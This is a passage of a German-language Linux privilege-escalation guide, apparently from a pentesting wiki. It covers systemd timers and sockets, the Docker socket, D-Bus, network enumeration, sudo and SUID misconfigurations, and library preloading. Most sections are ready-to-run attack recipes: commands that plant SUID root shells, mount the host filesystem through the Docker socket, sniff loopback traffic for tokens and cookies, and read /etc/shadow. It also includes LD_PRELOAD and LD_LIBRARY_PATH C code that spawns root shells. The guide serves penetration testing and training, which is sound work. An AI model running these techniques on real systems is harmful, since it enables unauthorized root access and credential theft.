> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, ist dieser Wert standardmäßig ein Service, der denselben Namen wie die timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Unit-Name, der aktiviert wird, und der Unit-Name der timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Finde eine systemd Unit (wie eine `.service`), die **eine beschreibbare Binärdatei ausführt**
- Finde eine systemd Unit, die **einen relativen Pfad ausführt** und über **Schreibrechte** auf den **systemd PATH** verfügt (um dieses ausführbare Programm zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** **aktiviert** wird, indem ein Symlink darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf demselben oder unterschiedlichen Rechnern innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Descriptor-Dateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammengefasst dienen sie dazu, **anzugeben, wo gelauscht wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6- und/oder Portnummer, auf die gelauscht werden soll, usw.)
- `Accept`: Nimmt ein boolsches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz** gestartet und nur das Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die gestartete Service-Unit übergeben, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Unit bedingungslos allen eingehenden Traffic verarbeitet. **Standard: false**. Aus Leistungsgründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**Sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**Sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **Service-Unit** an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit `Accept=no` erlaubt. Standardmäßig ist es die Service-Unit mit demselben Namen wie der Socket (Suffix ersetzt). In den meisten Fällen ist die Verwendung dieser Option nicht notwendig.

### Schreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher musst du **wahrscheinlich bis zum Neustart der Maschine warten.**\
_Beachte, dass das System diese Socket-Dateikonfiguration verwenden muss, sonst wird die backdoor nicht ausgeführt_

### Socket activation + writable unit path (create missing service)

Eine weitere hochwirksame Fehlkonfiguration ist:

- eine socket unit mit `Accept=no` und `Service=<name>.service`
- die referenzierte Service-Unit fehlt
- ein Angreifer kann in `/etc/systemd/system` schreiben (oder in einen anderen Unit-Suchpfad)

In diesem Fall kann der Angreifer `<name>.service` erstellen und dann Traffic zum Socket auslösen, sodass systemd die neue Service-Unit lädt und als root ausführt.

Kurzer Ablauf:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Beschreibbare sockets

Wenn du **irgendeinen writable socket identifizierst** (_hier sprechen wir von Unix Sockets und nicht von den Konfigurationsdateien `.socket`_), dann **kannst du mit diesem socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Auflisten von Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** requests (_ich rede nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Wenn der Socket **auf eine HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und vielleicht **eine Schwachstelle exploiten**.

### Schreibbarer Docker-Socket

Der Docker-Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den Benutzer `root` und Mitglieder der Gruppe `docker` schreibbar. Schreibzugriff auf diesen Socket kann zu privilege escalation führen. Nachfolgend eine Aufschlüsselung, wie das durchgeführt werden kann, und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du privilege escalation durchführen, indem du die folgenden Befehle verwendest:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Mit diesen Befehlen kannst du einen Container starten, der root-Zugriff auf das Dateisystem des Hosts hat.

#### **Docker API direkt verwenden**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet ist, kannst du Befehle direkt im Container ausführen und hast root-Zugriff auf das Dateisystem des Hosts.

### Andere

Beachte, dass wenn du Schreibrechte auf den docker socket hast, weil du **Teil der Gruppe `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) hast. Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sieh dir **more ways to break out from containers or abuse container runtimes to escalate privileges** in:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn du das **`ctr`**-Kommando verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn du das **`runc`**-Kommando verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Interprozesskommunikation (IPC)-System**, das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, vergleichbar mit **erweiterten UNIX-Domain-Sockets**. Zudem hilft es beim Broadcasten von Ereignissen oder Signalen und fördert so die nahtlose Integration von Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten, wodurch die Benutzererfahrung verbessert wird. Darüber hinaus unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse rationalisiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **allow/deny model**, bei dem Nachrichtenberechtigungen (Method Calls, Signal Emissions, usw.) basierend auf dem kumulativen Effekt übereinstimmender Policy-Regeln verwaltet werden. Diese Policies legen fest, welche Interaktionen mit dem Bus zulässig sind und können durch Ausnutzung dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel einer solchen Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen, die es dem root-Benutzer erlauben, `fi.w1.wpa_supplicant1` zu besitzen, an sie zu senden und von ihr zu empfangen.

Richtlinien ohne einen angegebenen Benutzer oder eine Gruppe gelten universell, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man enumerate und exploit a D-Bus communication:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine zu ermitteln.

### Allgemeine enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Schnelle Triage bei ausgehendem Datenverkehr

Wenn der Host Befehle ausführen kann, aber callbacks fehlschlagen, trenne schnell DNS-, Transport-, Proxy- und Routing-Filter:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Offene Ports

Prüfe immer Netzwerkdienste, die auf dem Rechner laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiziere listeners nach bind target:

- `0.0.0.0` / `[::]`: auf allen lokalen Interfaces exponiert.
- `127.0.0.1` / `::1`: nur lokal (gute tunnel/forward-Kandidaten).
- Spezifische interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalerweise nur von internen Segmenten erreichbar.

### Triage-Workflow für nur lokal erreichbare Dienste

Wenn du einen Host kompromittierst, werden Dienste, die an `127.0.0.1` gebunden sind, oft zum ersten Mal von deiner Shell aus erreichbar. Ein schneller lokaler Workflow ist:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS als Netzwerkscanner (nur Netzwerkmodus)

Neben lokalen PE checks kann linPEAS als fokussierter Netzwerkscanner ausgeführt werden. Es nutzt verfügbare Binaries im `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert kein tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Wenn du `-d`, `-p` oder `-i` ohne `-t` übergibst, verhält sich linPEAS wie ein reiner network scanner (überspringt den Rest der privilege-escalation checks).

### Sniffing

Prüfe, ob du traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
Schnelle praktische Prüfungen:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ist besonders wertvoll in post-exploitation, da viele nur intern erreichbare Dienste dort tokens/cookies/credentials bereitstellen:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture jetzt, parse später:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Benutzer

### Generic Enumeration

Prüfe **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** im System vorhanden sind, welche sich **anmelden** können und welche **root-Privilegien** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Ausnutzen mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer Gruppe bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort der Umgebung kennst**, **versuche, dich mit diesem Passwort als jeden Benutzer einzuloggen**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu machen, und die Binaries `su` und `timeout` auf dem Computer vorhanden sind, kannst du versuchen, Nutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) anzugreifen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer zu brute-forcen.

## Missbrauch von beschreibbaren $PATH-Verzeichnissen

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, kannst du möglicherweise Privilegien eskalieren, indem du **eine Backdoor in dem beschreibbaren Ordner erstellst**, die den Namen eines Befehls trägt, der von einem anderen Benutzer (idealerweise root) ausgeführt wird, und die **nicht aus einem Verzeichnis geladen wird, das in $PATH vor deinem beschreibbaren Ordner liegt**.

### SUDO and SUID

Du könntest berechtigt sein, bestimmte Befehle mit sudo auszuführen, oder einige Dateien könnten das suid-Bit gesetzt haben. Überprüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne dessen Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
An diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine Shell zu bekommen, indem man einen ssh key in das `root`-Verzeichnis einfügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Warum es funktioniert: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und sourced diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo erhalten bleibt, wird deine Datei mit root-Rechten gesourced.

- Requirements:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder ein beliebiges bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für sudo-erlaubte Befehle; verwende minimale Binaries.
- Ziehe sudo I/O-Logging und Benachrichtigungen in Betracht, wenn beibehaltene env vars verwendet werden.

### Terraform via sudo mit beibehaltetem HOME (!env_reset)

Wenn sudo die Umgebung intakt lässt (`!env_reset`) und `terraform apply` erlaubt, bleibt `$HOME` auf den aufrufenden Benutzer gesetzt. Terraform lädt daher **$HOME/.terraformrc** als root und beachtet `provider_installation.dev_overrides`.

- Weise den benötigten provider auf ein beschreibbares Verzeichnis und lege ein bösartiges Plugin ab, benannt nach dem Provider (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform schlägt beim Go-Plugin-Handshake fehl, führt die payload jedoch als root aus, bevor es abstirbt, und hinterlässt eine SUID shell.

### TF_VAR-Überschreibungen + symlink-Validierungs-Bypass

Terraform-Variablen können über die Umgebungsvariablen `TF_VAR_<name>` bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung beibehält. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` lassen sich mit symlinks umgehen:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den symlink auf und kopiert die echte `/root/root.txt` in ein für Angreifer lesbares Ziel. Derselbe Ansatz kann verwendet werden, um **in privilegierte Pfade zu schreiben**, indem Ziel-Symlinks vorab erstellt werden (z. B. indem der Zielpfad des Providers auf einen Pfad innerhalb von `/etc/cron.d/` zeigt).

### requiretty / !requiretty

Auf einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert werden, was sudo dazu zwingt, nur von einem interaktiven TTY ausgeführt zu werden. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht-interaktiven Kontexten wie reverse shells, cron jobs oder scripts ausgeführt werden.
```bash
Defaults !requiretty
```
Dies ist für sich genommen keine direkte Verwundbarkeit, erweitert jedoch die Situationen, in denen sudo-Regeln ohne vollständiges PTY missbraucht werden können.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` anzeigt oder ein `secure_path` Einträge enthält, die vom Angreifer beschrieben werden können (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des sudo-gestatteten Ziels überschattet werden.

- Voraussetzungen: eine sudo-Regel (häufig `NOPASSWD`), die ein Skript/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps`, etc.) und ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführung: Pfade umgehen
**Springe**, um andere Dateien zu lesen, oder verwende **symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binärdatei ohne Angabe des Befehls-Pfads

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** vergeben ist: _hacker10 ALL= (root) less_ kannst du dies ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit Befehls-Pfad

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine Funktion zu **exportieren**, die denselben Namen wie der vom suid-File aufgerufene Befehl trägt.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du das suid-Binary aufrufst, wird diese Funktion ausgeführt

### Schreibbares Skript, ausgeführt von einem SUID-Wrapper

Eine häufige Fehlkonfiguration bei Custom-Apps ist ein root-eigener SUID-Binary-Wrapper, der ein Skript ausführt, während das Skript selbst von low-priv users beschreibbar ist.

Typisches Muster:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Wenn `/usr/local/bin/backup.sh` beschreibbar ist, können Sie Payload-Befehle anhängen und dann den SUID-Wrapper ausführen:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Schnelle Prüfungen:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang wird als Vorladen einer Bibliothek bezeichnet.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion missbraucht wird — insbesondere bei **suid/sgid**-ausführbaren Dateien — erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei **suid/sgid**-ausführbaren Dateien werden nur Bibliotheken aus Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Eine Privilegieneskalation kann auftreten, wenn Sie in der Lage sind, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei Ausführung von Befehlen mit `sudo` berücksichtigt wird, was möglicherweise zur Ausführung beliebigen Codes mit erhöhten Rechten führt.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** env variable kontrolliert, da er bestimmt, in welchen Pfaden Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
